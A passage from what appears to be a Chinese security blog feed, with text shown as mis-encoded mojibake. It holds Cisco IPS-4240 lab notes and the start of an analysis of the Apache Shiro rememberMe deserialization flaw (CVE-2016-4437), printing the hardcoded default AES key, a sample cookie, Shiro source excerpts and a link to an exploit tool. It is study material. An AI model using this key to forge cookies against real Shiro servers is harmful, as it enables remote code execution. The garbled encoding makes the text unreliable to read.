<li>â–² å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç­–ç•¥é…ç½®åœ¨ä¸åŒçš„VSé‡Œé¢ã€‚å”¯ç‹¬ï¼æ¥å£ä¸èƒ½å¤Ÿé‡å¤é…ç½®åœ¨å…¶ä»–çš„VS</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--VS1.png" alt="IME--IPS--VS1"></p>
<ul>
<li>Edit Actionsï¼šç¼–è¾‘é’ˆå¯¹æŸä¸ªSigè¢«è§¦å‘åæ‰€æ‰§è¡Œçš„åŠ¨ä½œ<ul>
<li>å‘Šè­¦å’Œæ—¥å¿—è¡Œä¸º<ul>
<li>Produce Alertâ€“äº§ç”Ÿå‘Šè­¦</li>
<li>Produce Verbose Alertâ€“äº§ç”Ÿå†—é•¿å‘Šè­¦ã€‚æŠŠè§¦å‘è¿™ä¸ªSigçš„æ•°æ®æŠ“åŒ…ï¼Œå¹¶é™„åœ¨å‘Šè­¦é‡Œ</li>
<li>Log Attacker Packetsâ€“Logæ”»å‡»è€…ã€‚å¯¹è§¦å‘è¿™æ¡Sigçš„æ•°æ®æŠ¥æ–‡çš„æºIPåœ°å€ï¼Œåœ¨åé¢çš„ä¸€å®šæ—¶é—´å†…ï¼ˆå¯ä¿®æ”¹ï¼‰ã€‚å¯¹å…¶è¿›è¡ŒæŠ“åŒ…ï¼Œåœæ­¢åï¼Œå¯ä»¥é€šè¿‡IDMä¸‹è½½è¿™ä¸ªæŠ“åŒ…æ–‡ä»¶ã€‚ä½¿ç”¨æŠ“åŒ…æ”»å‡»æ‰“å¼€ï¼Œè¿›è¡Œæ•°æ®çš„åˆ†æ â€”-å•ä¸€æ”»å‡»æº</li>
<li>Log Victim Packetsâ€“Logå—å®³è€…ã€‚å¯¹è§¦å‘è¿™æ¡Sigçš„æ•°æ®æŠ¥æ–‡çš„ç›®çš„IPåœ°å€ï¼Œåœ¨åé¢çš„ä¸€å®šæ—¶é—´å†…ï¼ˆå¯ä¿®æ”¹ï¼‰å¯¹å…¶è¿›è¡ŒæŠ“åŒ…ã€‚åœæ­¢å â€”-å¤šæ”»å‡»æº</li>
<li>Log Pair Packetsâ€“Log pairã€‚å¯¹è§¦å‘è¿™æ¡Sigçš„æ•°æ®æŠ¥æ–‡çš„æŒ‡å®šçš„æºå’Œç›®çš„åœ°å€IPåœ°å€ï¼Œåœ¨åé¢çš„ä¸€å®šæ—¶é—´å†…ï¼ˆå¯ä¿®æ”¹ï¼‰ã€‚å¯¹å…¶è¿›è¡ŒæŠ“åŒ…ã€‚åœæ­¢åï¼Œå¯ä»¥é€šè¿‡IDMä¸‹è½½è¿™ä¸ªæŠ“åŒ…æ–‡ä»¶ã€‚ä½¿ç”¨æŠ“åŒ…å·¥å…·æ‰“å¼€ï¼Œè¿›è¡Œæ•°æ®çš„åˆ†æ</li>
<li>Request SNMP Trapâ€“SNMP Trapã€‚éœ€è¦æŒ‡å®šSNMPæœåŠ¡å™¨ã€‚æŠŠè§¦å‘è¿™æ¡Sigçš„å‘Šè­¦ä¸Šä¼ åˆ°æŒ‡å®šæœåŠ¡å™¨</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS--Edit-Actions.png" alt="IME--IPS--Edit-Actions"></p>
<h3 id="0X03-IMEâ€“IDSå®éªŒ"><a href="#0X03-IMEâ€“IDSå®éªŒ" class="headerlink" title="0X03 IMEâ€“IDSå®éªŒ"></a>0X03 IMEâ€“IDSå®éªŒ</h3><h5 id="IDSæ¨¡æ‹Ÿå®éªŒ"><a href="#IDSæ¨¡æ‹Ÿå®éªŒ" class="headerlink" title="IDSæ¨¡æ‹Ÿå®éªŒ"></a>IDSæ¨¡æ‹Ÿå®éªŒ</h5><ul>
<li>R1ï¼šRouter C3700</li>
<li>R1ï¼šRouter C3700</li>
<li>IDSï¼šIPS-4240</li>
<li>SWï¼šEtherSwitch router</li>
<li>â–² 2020.03.09 è™šæ‹ŸæœºIPS-4240çš„è™šæ‹Ÿç½‘å¡VMware1å’ŒVMware2éœ€è¦å¼€å¯ä¸»æœºè¿æ¥ï¼Œä¸”è‹¥åœ¨GNS3ä¸­æ— å‡ºç°æ­¤ä¸¤ä¸ªç½‘å¡ï¼Œå¯é‡å¯è®¡ç®—æœºï¼Œå³å¯æŠ“åˆ°è¿™ä¸¤ä¸ªç½‘å¡</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%BC%80%E5%90%AF%E7%9A%84%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5.png" alt="IPS-4240å¼€å¯çš„ä¸»æœºè¿æ¥"></p>
<p><img src="/images/ips/ips-notepad/IDS%E6%9D%82%E5%90%88%E6%A8%A1%E5%BC%8F%E6%8A%A5%E8%AD%A6%E6%8B%93%E6%89%91%E5%9B%BE.png" alt="IDSæ‚åˆæ¨¡å¼æŠ¥è­¦æ‹“æ‰‘å›¾"></p>
<h5 id="IDSï¼šIPS-4240"><a href="#IDSï¼šIPS-4240" class="headerlink" title="IDSï¼šIPS-4240"></a>IDSï¼šIPS-4240</h5><ul>
<li>æ”¹å˜å¤–å½¢ï¼šå³é”® -&gt; Change Symbol -&gt; ids</li>
<li>ä¿®æ”¹åå­—ï¼šå³é”® -&gt; Change the hostname -&gt; IDS</li>
<li>å¢åŠ ç›‘æ§ç½‘å¡ï¼šConfigure -&gt; NIO Ethernet -&gt; Add VMnet1</li>
</ul>
<h5 id="R1å’ŒR2"><a href="#R1å’ŒR2" class="headerlink" title="R1å’ŒR2"></a>R1å’ŒR2</h5><ul>
<li>å¯åŠ¨ï¼Œé™ä½ç³»ç»Ÿèµ„æºæ¶ˆè€—ï¼šå³é”® -&gt; Idle PC -&gt; é€‰å–å¸¦*å·çš„å‚æ•°è®¾å¤‡</li>
<li>é…ç½®R1<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.1 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>é…ç½®R2<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.2 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>è¿é€šæ€§ï¼šR1 -&gt; do ping 10.1.1.2 -&gt; R2æ˜¯å¦è”é€š</li>
</ul>
<h5 id="SWï¼šEtherSwitch-router"><a href="#SWï¼šEtherSwitch-router" class="headerlink" title="SWï¼šEtherSwitch router"></a>SWï¼šEtherSwitch router</h5><ul>
<li>å¯åŠ¨ï¼Œé™ä½ç³»ç»Ÿèµ„æºæ¶ˆè€—ï¼šå³é”® -&gt; Idle PC -&gt; é€‰å–å¸¦*å·çš„å‚æ•°è®¾å¤‡</li>
<li>ä¿®æ”¹åå­—ï¼šå³é”® -&gt; Change the hostname -&gt; SW</li>
<li>å¢åŠ æ¥å£ï¼šå³é”® -&gt; Slots -&gt; å¢åŠ ä¸€ä¸ªNM-16ESW</li>
</ul>
<h5 id="æµ‹è¯•è¿é€šæ€§"><a href="#æµ‹è¯•è¿é€šæ€§" class="headerlink" title="æµ‹è¯•è¿é€šæ€§"></a>æµ‹è¯•è¿é€šæ€§</h5><ul>
<li>R1(f 1/0)-&gt; SW(f 1/1)</li>
<li>R2(f 1/0)-&gt; SW(f 1/2)</li>
<li>IDS -&gt; SW(f 1/15)</li>
<li>è¿é€šæ€§ï¼šR1 -&gt; ping 10.1.1.2 -&gt; R2æ˜¯å¦è¿é€š</li>
</ul>
<h5 id="SPANé…ç½®"><a href="#SPANé…ç½®" class="headerlink" title="SPANé…ç½®"></a>SPANé…ç½®</h5><ul>
<li>SWï¼šEtherSwitch router<ul>
<li>monitor session 1 source interface f1/1 rx  //R1</li>
<li>monitor session 1 destination interface f1/15  //IDS</li>
</ul>
</li>
</ul>
<h5 id="å…¥ä¾µæ£€æµ‹"><a href="#å…¥ä¾µæ£€æµ‹" class="headerlink" title="å…¥ä¾µæ£€æµ‹"></a>å…¥ä¾µæ£€æµ‹</h5><ul>
<li>â–² æ‰€æœ‰çš„æ­¥éª¤éƒ½éœ€è¦è¿›è¡ŒApply</li>
<li>IMEå¯åŠ¨IPS</li>
<li>å¼€å¯Interfaceæ¥å£<ul>
<li>Configuration -&gt; Interface -&gt; GigabitEthernet 0/0 -&gt; Edit -&gt; enable</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E5%BC%80%E5%90%AFInterface%E6%8E%A5%E5%8F%A3.png" alt="IME--IDSå¼€å¯Interfaceæ¥å£"></p>
<ul>
<li>ç»‘å®šç—…æ¯’ç‰¹å¾è¯†åˆ«åº“Sig0<ul>
<li>Configuration -&gt; Policies -&gt; vs0 -&gt; Edit -&gt; GigabitEthernet 0/0</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E7%BB%91%E5%AE%9A%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IDSç»‘å®šç—…æ¯’ç‰¹å¾è¯†åˆ«åº“Sig0"></p>
<ul>
<li>é…ç½®ç—…æ¯’ç‰¹å¾è¯†åˆ«åº“Sig0<ul>
<li>Sig0 -&gt; OS -&gt; 2004(è¿‡æ»¤) -&gt; Change status To -&gt; Active</li>
<li>Sig0 -&gt; OS -&gt; 2004(è¿‡æ»¤) -&gt; Enable</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E9%85%8D%E7%BD%AE%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IDSé…ç½®ç—…æ¯’ç‰¹å¾è¯†åˆ«åº“Sig0"></p>
<ul>
<li>ç›‘æ§IDS-ICMPäº‹ä»¶<ul>
<li>Configuration -&gt; Sensor Monitoring -&gt; View</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E7%9B%91%E6%8E%A7IDS-ICMP%E4%BA%8B%E4%BB%B6.png" alt="IME--IDSç›‘æ§IDS-ICMPäº‹ä»¶"></p>
<ul>
<li>R1å‘R2å‘ç”ŸICMP Echo Requsetçš„PingåŒ…ï¼ŒæŸ¥çœ‹IMEâ€“IPSçš„Event Vieweræœ‰æ— æŠ¥è­¦æ—¥å¿—</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IDS%E7%9B%91%E6%8E%A7IDS%E4%BA%8B%E4%BB%B6.png" alt="IME--IDSç›‘æ§IDSäº‹ä»¶"> </p>
<h3 id="0X04-IMEâ€“IPSå®éªŒ"><a href="#0X04-IMEâ€“IPSå®éªŒ" class="headerlink" title="0X04 IMEâ€“IPSå®éªŒ"></a>0X04 IMEâ€“IPSå®éªŒ</h3><h5 id="IPSæ¨¡æ‹Ÿå®éªŒ"><a href="#IPSæ¨¡æ‹Ÿå®éªŒ" class="headerlink" title="IPSæ¨¡æ‹Ÿå®éªŒ"></a>IPSæ¨¡æ‹Ÿå®éªŒ</h5><ul>
<li>R1ï¼šRouter C3700</li>
<li>R1ï¼šRouter C3700</li>
<li>IDSï¼šIPS-4240</li>
<li>SWï¼šä»¥å¤ªç½‘äº¤æ¢æœº</li>
<li>â–² 2020.03.09 è™šæ‹ŸæœºIPS-4240çš„è™šæ‹Ÿç½‘å¡VMware1å’ŒVMware2éœ€è¦å¼€å¯ä¸»æœºè¿æ¥ï¼Œä¸”è‹¥åœ¨GNS3ä¸­æ— å‡ºç°æ­¤ä¸¤ä¸ªç½‘å¡ï¼Œå¯é‡å¯è®¡ç®—æœºï¼Œå³å¯æŠ“åˆ°è¿™ä¸¤ä¸ªç½‘å¡</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%BC%80%E5%90%AF%E7%9A%84%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5.png" alt="IPS-4240å¼€å¯çš„ä¸»æœºè¿æ¥"></p>
<p><img src="/images/ips/ips-notepad/IPS%E5%9C%A8%E7%BA%BF%E6%A8%A1%E5%BC%8F%E6%8A%A5%E8%AD%A6%E6%8B%93%E6%89%91%E5%9B%BE.png" alt="IPSåœ¨çº¿æ¨¡å¼æŠ¥è­¦æ‹“æ‰‘å›¾"></p>
<h5 id="IPSï¼šIPS-4240"><a href="#IPSï¼šIPS-4240" class="headerlink" title="IPSï¼šIPS-4240"></a>IPSï¼šIPS-4240</h5><ul>
<li>æ”¹å˜å¤–å½¢ï¼šå³é”® -&gt; Change Symbol -&gt; ids</li>
<li>ä¿®æ”¹åå­—ï¼šå³é”® -&gt; Change the hostname -&gt; IDS</li>
<li>å¢åŠ ç›‘æ§ç½‘å¡ï¼šConfigure -&gt; NIO Ethernet -&gt; Add VMnet1</li>
<li>å¢åŠ ç›‘æ§ç½‘å¡ï¼šConfigure -&gt; NIO Ethernet -&gt; Add VMnet2</li>
</ul>
<h5 id="R1å’ŒR2-1"><a href="#R1å’ŒR2-1" class="headerlink" title="R1å’ŒR2"></a>R1å’ŒR2</h5><ul>
<li>å¯åŠ¨ï¼Œé™ä½ç³»ç»Ÿèµ„æºæ¶ˆè€—ï¼šå³é”® -&gt; Idle PC -&gt; é€‰å–å¸¦*å·çš„å‚æ•°è®¾å¤‡</li>
<li>é…ç½®R1<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.1 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>é…ç½®R2<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.2 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>è¿é€šæ€§ï¼šR1 -&gt; do ping 10.1.1.2 -&gt; R2æ˜¯å¦è”é€š</li>
</ul>
<h5 id="SWï¼šEthernet-switch"><a href="#SWï¼šEthernet-switch" class="headerlink" title="SWï¼šEthernet switch"></a>SWï¼šEthernet switch</h5><ul>
<li>å¯åŠ¨ï¼Œé™ä½ç³»ç»Ÿèµ„æºæ¶ˆè€—ï¼šå³é”® -&gt; Idle PC -&gt; é€‰å–å¸¦*å·çš„å‚æ•°è®¾å¤‡</li>
<li>ä¿®æ”¹åå­—ï¼šå³é”® -&gt; Change the hostname -&gt; SW</li>
<li>å¢åŠ æ¥å£ï¼šå³é”® -&gt; Slots -&gt; å¢åŠ ä¸€ä¸ªNM-16ESW</li>
</ul>
<h5 id="æµ‹è¯•è¿é€šæ€§-1"><a href="#æµ‹è¯•è¿é€šæ€§-1" class="headerlink" title="æµ‹è¯•è¿é€šæ€§"></a>æµ‹è¯•è¿é€šæ€§</h5><ul>
<li>R1(f 1/0)-&gt; SW(1)</li>
<li>R2(f 1/0)-&gt; SW(2)</li>
<li>IDS -&gt; SW(3)</li>
<li>IDS -&gt; SW(4)</li>
</ul>
<h5 id="æ‹“æ‰‘é…ç½®"><a href="#æ‹“æ‰‘é…ç½®" class="headerlink" title="æ‹“æ‰‘é…ç½®"></a>æ‹“æ‰‘é…ç½®</h5><ul>
<li>â–² æ‰€æœ‰çš„æ­¥éª¤éƒ½éœ€è¦è¿›è¡ŒApply</li>
<li>IMEä¸­é…ç½®æ¥å£å¯¹ï¼ˆmypairï¼‰<ul>
<li>Configuration -&gt; Interface Pairs -&gt; Add -&gt; é€‰å–ä¸€å¯¹æ¥å£ -&gt; å¼€å¯</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E9%85%8D%E7%BD%AEmypair.png" alt="IME--IPSé…ç½®mypair"></p>
<ul>
<li>ç»‘å®šç—…æ¯’ç‰¹å¾è¯†åˆ«åº“Sig0<ul>
<li>Configuration -&gt; Policies -&gt; vs0 -&gt; Edit -&gt; mypair</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E7%BB%91%E5%AE%9A%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IPSç»‘å®šç—…æ¯’ç‰¹å¾è¯†åˆ«åº“Sig0"></p>
<ul>
<li><p>åˆ’åˆ†VLAN</p>
<ul>
<li>SW<ul>
<li>ç«¯å£1ã€3å±äºVLAN2</li>
<li>ç«¯å£2ã€4å±äºVLAN3</li>
</ul>
</li>
</ul>
</li>
<li><p>è¿é€šæ€§ï¼šR1 -&gt; ping 10.1.1.2 -&gt; R2æ˜¯å¦è¿é€š</p>
</li>
</ul>
<h5 id="å…¥ä¾µæ£€æµ‹-1"><a href="#å…¥ä¾µæ£€æµ‹-1" class="headerlink" title="å…¥ä¾µæ£€æµ‹"></a>å…¥ä¾µæ£€æµ‹</h5><ul>
<li>â–² æ‰€æœ‰çš„æ­¥éª¤éƒ½éœ€è¦è¿›è¡ŒApply</li>
<li>é…ç½®ç—…æ¯’ç‰¹å¾è¯†åˆ«åº“Sig0<ul>
<li>Sig0 -&gt; OS -&gt; 2004(è¿‡æ»¤) -&gt; Change status To -&gt; Active</li>
<li>Sig0 -&gt; OS -&gt; 2004(è¿‡æ»¤) -&gt; Enable</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E9%85%8D%E7%BD%AE%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IPSé…ç½®ç—…æ¯’ç‰¹å¾è¯†åˆ«åº“Sig0"></p>
<ul>
<li>ç›‘æ§IPS-ICMPäº‹ä»¶<ul>
<li>Configuration -&gt; Sensor Monitoring -&gt; View</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E7%9B%91%E6%8E%A7IPS-ICMP%E4%BA%8B%E4%BB%B6.png" alt="IME--IPSç›‘æ§IPS-ICMPäº‹ä»¶"></p>
<ul>
<li>R1å‘R2å‘ç”ŸICMP Echo Requsetçš„PingåŒ…ï¼ŒæŸ¥çœ‹IMEâ€“IPSçš„Event Vieweræœ‰æ— æŠ¥è­¦æ—¥å¿—</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME--IPS%E7%9B%91%E6%8E%A7IPS%E4%BA%8B%E4%BB%B6.png" alt="IME--IPSç›‘æ§IPSäº‹ä»¶"> </p>
]]></content>
      <categories>
        <category>IPS</category>
      </categories>
  </entry>
  <entry>
    <title>Shiroååºåˆ—åŒ–æ¼æ´</title>
    <url>/2020/08/30/shiro_unserialize/</url>
    <content><![CDATA[<h2 id="Shiro-ååºåˆ—åŒ–æ¼æ´"><a href="#Shiro-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Shiro ååºåˆ—åŒ–æ¼æ´"></a>Shiro ååºåˆ—åŒ–æ¼æ´</h2><h3 id="0X00-Shiro-rememberMe-Shiro-550"><a href="#0X00-Shiro-rememberMe-Shiro-550" class="headerlink" title="0X00 Shiro rememberMe(Shiro-550)"></a>0X00 Shiro rememberMe(Shiro-550)</h3><blockquote>
<p>CVE-2016-4437</p>
</blockquote>
<h5 id="å½±å“ç‰ˆæœ¬ï¼šApache-Shiro-lt-1-2-4"><a href="#å½±å“ç‰ˆæœ¬ï¼šApache-Shiro-lt-1-2-4" class="headerlink" title="å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.2.4"></a>å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.2.4</h5><h5 id="ä¸€é”®åˆ©ç”¨å·¥å…·ï¼šShiroExploit"><a href="#ä¸€é”®åˆ©ç”¨å·¥å…·ï¼šShiroExploit" class="headerlink" title="ä¸€é”®åˆ©ç”¨å·¥å…·ï¼šShiroExploit"></a>ä¸€é”®åˆ©ç”¨å·¥å…·ï¼š<a href="https://github.com/feihong-cs/ShiroExploit" target="_blank" rel="noopener">ShiroExploit</a></h5><h5 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h5><ul>
<li>shiroåœ¨ç™»å½•å¤„æä¾›äº†Remember Meè¿™ä¸ªåŠŸèƒ½ï¼Œæ¥è®°å½•ç”¨æˆ·ç™»å½•çš„å‡­è¯ï¼Œç„¶åshiroä½¿ç”¨äº†CookieRememberMeManagerç±»å¯¹ç”¨æˆ·çš„ç™»é™†å‡­è¯ï¼Œä¹Ÿå°±æ˜¯Remember Meçš„å†…å®¹è¿›è¡Œä¸€ç³»åˆ—å¤„ç†ï¼š</li>
</ul>
<p><strong>ä½¿ç”¨Javaåºåˆ—åŒ– â€”&gt; ä½¿ç”¨å¯†é’¥è¿›è¡ŒAESåŠ å¯† â€”&gt; Base64åŠ å¯† â€”&gt; å¾—åˆ°åŠ å¯†åçš„Remember Meå†…å®¹</strong></p>
<ul>
<li>åŒæ—¶åœ¨è¯†åˆ«ç”¨æˆ·èº«ä»½çš„æ—¶å€™ï¼Œéœ€è¦å¯¹Remember Meçš„å­—æ®µè¿›è¡Œè§£å¯†ï¼Œè§£å¯†çš„é¡ºåºä¸ºï¼š</li>
</ul>
<p><strong>Remember MeåŠ å¯†å†…å®¹ â€”&gt; Base64è§£å¯† â€”&gt; ä½¿ç”¨å¯†é’¥è¿›è¡ŒAESè§£å¯† â€”&gt;Javaååºåˆ—åŒ–</strong></p>
<ul>
<li>â–² é—®é¢˜å‡ºåœ¨<strong>AESåŠ å¯†çš„å¯†é’¥Keyè¢«ç¡¬ç¼–ç åœ¨ä»£ç é‡Œ</strong>ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…åªè¦é€šè¿‡æºä»£ç æ‰¾åˆ°AESåŠ å¯†çš„å¯†é’¥ï¼Œå°±å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œå¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼ŒAESåŠ å¯†ï¼ŒBase64ç¼–ç ï¼Œç„¶åå°†å…¶ä½œä¸ºcookieçš„Remember Meå­—æ®µå‘é€ï¼ŒShiroå°†RememberMeè¿›è¡Œè§£å¯†å¹¶ä¸”ååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆååºåˆ—åŒ–æ¼æ´</li>
</ul>
<h5 id="æ¼æ´åŠ å¯†åˆ†æ"><a href="#æ¼æ´åŠ å¯†åˆ†æ" class="headerlink" title="æ¼æ´åŠ å¯†åˆ†æ"></a>æ¼æ´åŠ å¯†åˆ†æ</h5><ul>
<li>ç™»å½•<a href="http://localhost:8080/login.jsp" target="_blank" rel="noopener">http://localhost:8080/login.jsp</a> ï¼Œå‹¾é€‰rememberMeï¼Œç™»å½•æˆåŠŸåä¼šçœ‹åˆ°ä¸€ä¸ªkeyä¸ºrememberMeï¼Œvalueé•¿åº¦ä¸º512çš„Cookie</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rememberMe=WM0+3iRZaxl/mYdNM2vyqOvxRiJfMtqkfv2mJX6cLUZQFRnWcS5jVR+e43SeN+yeBoWiVDjFBDSNp5+YGf9y1av27VuG8bYwTOaHkFVkoeFKpJadtV0tAGxcpI9e4il6D9OHH6k7PcJCdtaUnLPGwqnRGGHZjD1M/ZM8KSawiHAfme9rKC0pxijJoMIaz9jSEaOmJnXDzBIAgnSkikJD9s5LO3fpNMHuaHCC8Hqcrna8vn5sEKD1jIlGxugTFWoyMeYQzVvIxhZbs8v5mJfTXFRSVmfH9FrotQqKCJLD3V8WFckEZdMQIYvozXuym1LGix0QaP9F7sjoCvNt953nwYiJHGoiOwpP/V2LjLY60usnFP+Qu+FKRYIjUrcCT6NyasQL4ehTpUZ3uoxp9NYy5sv/MsW5g335odrtzA03LOM0ZDXqHS/aAuPpO74RmN3K7aq3dzOpQrEY7CTfkKLbQjA3Iz9fzSYgxlq7UoXjkp5/E1cr7KRlLqv8Edr9uU0lWb5XU2Thp+mA4RlRbYetAg==</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/550-remember-cookie.png" alt="550-remember-cookie"></p>
<ul>
<li><p>å‡è®¾ä»¥adminç”¨æˆ·ç™»å½•ï¼Œç™»å½•æˆåŠŸçš„æƒ…å†µä¸‹ï¼Œshiroä¼šå…ˆå°†adminå­—ç¬¦ä¸²è¿›è¡Œåºåˆ—åŒ–ï¼Œä½¿ç”¨DefaultSerializerç±»çš„serializeç±»çš„serizlizeæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serialize(principals); <span class="comment">// è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line">        <span class="keyword">if</span> (getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            bytes = encrypt(bytes); <span class="comment">// AESåŠ å¯†</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¤„ç†Cookieçš„ç±»  -&gt;  CookieRememberMeManaer</p>
<ul>
<li>ç»§æ‰¿AbstractRememberMeManagerç±»</li>
</ul>
</li>
<li><p>è·Ÿè¿›AbstractRememberMeManagerç±»  -&gt; ä»onSuccessfulLoginæ–¹æ³•ä¸‹æ–­ç‚¹ï¼Œdebugå°±å¯ä»¥çœ‹åˆ°é€»è¾‘</p>
<ul>
<li>å¾ˆå®¹æ˜“çœ‹åˆ°AESçš„Key</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>encryptæ–¹æ³•ä¸­ï¼ŒAESçš„æ¨¡å¼ä¸ºAES/CBC/PKCS5Paddingï¼Œå¹¶ä¸”å¹¶ä¸”AESçš„keyä¸º    <code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code>ï¼Œè½¬æ¢ä¸º16è¿›åˆ¶åæ˜¯<code>\x90\xf1\xfe\x6c\x8c\x64\xe4\x3d\x9d\x79\x98\x88\xc5\xc6\x9a\x68</code>ï¼Œkeyä¸º16å­—èŠ‚ï¼Œ128ä½</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">        CipherService cipherService = getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">            value = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>è¿›è¡ŒAESåŠ å¯†ï¼Œåˆ©ç”¨arraycopy()æ–¹æ³•å°†éšæœºçš„16å­—èŠ‚IVæ”¾åˆ°åºåˆ—åŒ–åçš„æ•°æ®å‰é¢ï¼Œå®Œæˆåå†è¿›è¡ŒAESåŠ å¯†ã€‚æœ€ååœ¨CookieRememberMeManagerç±»çš„rememberSerializedIdentity()æ–¹æ³•ä¸­è¿›è¡Œbase64åŠ å¯†</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String base64 = Base64.encodeToString(serialized);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="æ¼æ´è§£æåˆ†æ"><a href="#æ¼æ´è§£æåˆ†æ" class="headerlink" title="æ¼æ´è§£æåˆ†æ"></a>æ¼æ´è§£æåˆ†æ</h5><ul>
<li>é€šè¿‡AESçš„keyï¼ŒåŠ å¯†æ¨¡å¼AES/CBC/PKCS5Padding  -&gt;  åŠ è§£å¯†å¯†æ–‡</li>
<li>è·å–remmemberMeçš„Cookie</li>
<li>Base64è§£ç ï¼ŒCookieRememberMeManagerç±»çš„getRememberedSerializedIdentity()æ–¹æ³•</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] decoded = Base64.decode(base64);</span><br></pre></td></tr></table></figure>

<ul>
<li>AESè§£å¯†ï¼ŒBase64è§£ç åçš„å­—èŠ‚ï¼Œå‡å»å‰é¢16ä¸ªå­—èŠ‚ï¼Œä½¿ç”¨AbstractRememberMeManagerç±»çš„decrypt()æ–¹æ³•</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected byte[] decrypt(byte[] encrypted) &#123;</span><br><span class="line">        byte[] serialized = encrypted;</span><br><span class="line">        CipherService cipherService = getCipherService();</span><br><span class="line">        if (cipherService != null) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        return serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ååºåˆ—åŒ–ï¼Œä½¿ç”¨DefaultSerializerç±»çš„deserialize()æ–¹æ³•</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public T deserialize(byte[] serialized) throws SerializationException &#123;</span><br><span class="line">        if (serialized == null) &#123;</span><br><span class="line">            String msg = &quot;argument cannot be null.&quot;;</span><br><span class="line">            throw new IllegalArgumentException(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(serialized);</span><br><span class="line">        BufferedInputStream bis = new 